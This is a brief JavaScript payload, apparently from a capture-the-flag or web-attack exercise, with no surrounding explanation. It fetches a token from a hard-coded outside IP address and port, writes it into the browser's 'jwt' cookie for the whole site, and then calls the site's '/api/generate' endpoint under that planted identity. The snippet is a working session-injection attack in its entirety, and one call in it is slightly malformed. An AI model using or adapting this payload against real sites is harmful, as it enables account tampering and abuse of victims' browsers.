c = ''
document.cookie='jwt=';
(await fetch('//23.94.107.138:1231/').then((r)=>{r.text().then((r)=>{
    document.cookie = `jwt=${r.replace('\r', '').replace('\n', '')}; path=/`;
    fetch('/api/generate').then((r)=>{r.text});
})}));